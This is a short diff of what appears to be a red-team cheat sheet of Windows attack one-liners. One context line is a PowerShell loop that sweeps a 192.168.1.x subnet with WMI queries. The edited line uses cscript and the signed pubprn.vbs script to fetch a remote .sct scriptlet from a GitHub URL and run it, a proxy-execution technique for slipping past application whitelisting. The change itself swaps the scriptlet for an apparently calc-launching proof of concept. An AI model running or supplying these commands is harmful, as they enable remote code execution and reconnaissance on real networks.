@@ -86,7 +86,7 @@ for($i=1;$i -lt 255;$i++){Write-Host ("[*] 192.168.1." + $i); Get-WmiObject -cla
 
 ----------------------------------------------------------------------------------------------------------------------------------------
 
-cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/analyticsearch/SCTandXML/master/script.sct
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/analyticsearch/SCTandXML/master/scriptcalc.sct
 
 ----------------------------------------------------------------------------------------------------------------------------------------
 
